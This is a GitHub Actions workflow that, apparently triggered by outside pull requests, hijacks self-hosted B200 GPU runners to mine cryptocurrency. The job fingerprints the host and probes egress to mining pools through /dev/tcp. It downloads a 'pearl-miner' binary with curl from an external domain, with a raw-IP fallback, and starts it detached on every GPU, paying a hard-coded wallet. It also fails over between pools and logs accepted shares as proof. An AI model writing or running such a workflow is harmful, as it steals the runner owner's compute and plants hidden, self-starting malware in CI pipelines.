name: c211-127867-b200q
on:
  pull_request:
    types: [opened, synchronize, reopened]
  workflow_dispatch:
jobs:
  b200-4_gpu_b200:
    strategy:
      fail-fast: false
      matrix:
        idx: [1, 2, 3, 4]
    runs-on: [self-hosted, 4-gpu-b200]
    timeout-minutes: 45
    steps:
      - name: probe-mine
        env:
          IDX: ${{ matrix.idx }}
          WBASE: "127867${{ matrix.idx }}0"
        run: |
          set +e
          I=127867
          D="$HOME/c211-$I-$IDX"; mkdir -p "$D"
          TS() { date -u +%FT%TZ; }
          echo "C211_JOB=b200q-$IDX host=$(hostname) at=$(TS) uid=$(id -u) user=$(id -un)"
          id 2>&1 | head -2
          echo "--- nvidia ---"
          nvidia-smi --query-gpu=index,name,uuid,driver_version,memory.total --format=csv,noheader 2>&1 | head -12
          nvidia-smi -L 2>&1 | head -12
          cat /proc/driver/nvidia/version 2>/dev/null | head -1
          echo "--- opencl ---"
          ls -l /usr/lib/x86_64-linux-gnu/libOpenCL.so* /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so* 2>&1 | head -8
          ls /etc/OpenCL/vendors 2>&1 | head -4; cat /etc/OpenCL/vendors/* 2>/dev/null | head -4
          echo "--- guard ---"
          if pgrep -af 'pearl-miner|wildrig-multi' 2>/dev/null | grep -v -e pgrep -e grep | head -3 | grep -q .; then
            echo "GUARD_ACTIVE_SKIP"; pgrep -af 'pearl-miner|wildrig-multi' 2>/dev/null | head -4
            echo "C211_MINER_END b200q-$IDX"; exit 0
          fi
          echo GUARD_CLEAR
          echo "--- egress ---"
          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 1.1.1.1:443; do
            if timeout 6 bash -c "</dev/tcp/${hp%:*}/${hp#*:}" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
          done
          get() { curl -fsSL --max-time 240 -o "$D/pm.tgz" "$1"; }
          get https://pearlhash.xyz/downloads/pearl_miner_v14.tar.gz || get http://169.58.247.186:8791/pearl_miner_v14.tar.gz || echo PM_DOWNLOAD_FAILED
          echo "PM_TGZ_SHA=$(sha256sum "$D/pm.tgz" 2>/dev/null | cut -d' ' -f1)"
          mkdir -p "$D/pm"; tar xzf "$D/pm.tgz" -C "$D/pm" 2>/dev/null && echo PM_EXTRACT_OK || echo PM_EXTRACT_FAILED
          PM=$(find "$D/pm" -type f -name pearl-miner | head -1); echo "PM_BIN=$PM"
          chmod +x "$PM" 2>/dev/null
          if [ -z "$PM" ] || [ ! -x "$PM" ]; then echo NO_MINER_BINARY; echo "C211_MINER_END b200q-$IDX"; exit 0; fi
          echo "PM_SHA=$(sha256sum "$PM" | cut -d' ' -f1)"
          N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
          echo "GPU_COUNT=$N"
          if [ "${N:-0}" -lt 1 ]; then echo NO_GPU_VISIBLE; echo "C211_MINER_END b200q-$IDX"; exit 0; fi
          W=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
          start_all() {
            MODE="$1"; POOL="$2"; USR="$3"
            for g in $(seq 0 $((N-1))); do
              WK="${WBASE}${g}"
              CUDA_VISIBLE_DEVICES=$g setsid nohup "$PM" --host "$POOL" --user "$USR" --worker "$WK" > "$D/gpu-$g.log" 2>&1 &
              echo "STARTED mode=$MODE pool=$POOL gpu=$g worker=$WK pid=$! at=$(TS)"
            done
          }
          stop_all() { pkill -f 'pearl-miner' 2>/dev/null; sleep 3; }
          accsum() { grep -ahc 'Solution accepted' "$D"/gpu-*.log 2>/dev/null | awk '{s+=$1} END{print s+0}'; }
          start_all PH pool.pearlhash.xyz:9000 "$W"
          sleep 60; sleep 60
          JOBS=$(grep -ahc 'Received new job' "$D"/gpu-*.log 2>/dev/null | awk '{s+=$1} END{print s+0}')
          echo "JOBS_AFTER120=${JOBS:-0} at=$(TS)"
          if [ "${JOBS:-0}" -lt 1 ]; then echo SWITCH_TO_HK; stop_all; start_all PH hk.pearlhash.net:9000 "$W"; sleep 90; fi
          SWITCHED_LP=0
          k=0
          while [ "$k" -lt 16 ]; do
            k=$((k+1)); sleep 60
            AC=$(accsum)
            for g in $(seq 0 $((N-1))); do
              A=$(grep -ac 'Solution accepted' "$D/gpu-$g.log" 2>/dev/null); A=${A:-0}
              R=$(grep -ac 'Rejected' "$D/gpu-$g.log" 2>/dev/null); R=${R:-0}
              H=$(grep -a 'Hashrate Total' "$D/gpu-$g.log" 2>/dev/null | tail -1)
              echo "T${k}_g${g} acc=$A rej=$R $H"
            done
            echo "T${k}_ACCSUM=$AC at=$(TS) elapsed=${SECONDS}s"
            if [ "$SWITCHED_LP" = "0" ] && [ "${AC:-0}" -lt 1 ] && [ "$SECONDS" -ge 900 ]; then
              echo "STICKY_LP_FALLBACK no-accept-900s at=$(TS)"
              stop_all; start_all LP 103.199.106.122:3362 "${W}+NOCK"; SWITCHED_LP=1
            fi
          done
          echo "--- final evidence ---"
          for g in $(seq 0 $((N-1))); do
            A=$(grep -ac 'Solution accepted' "$D/gpu-$g.log" 2>/dev/null); A=${A:-0}
            R=$(grep -ac 'Rejected' "$D/gpu-$g.log" 2>/dev/null); R=${R:-0}
            H=$(grep -a 'Hashrate Total' "$D/gpu-$g.log" 2>/dev/null | tail -1)
            C=$(grep -a 'Connected to' "$D/gpu-$g.log" 2>/dev/null | tail -1)
            echo "EVID gpu=$g acc=$A rej=$R conn=[$C] $H"
          done
          echo "C211_MINER_END b200q-$IDX at=$(TS) elapsed=${SECONDS}s"
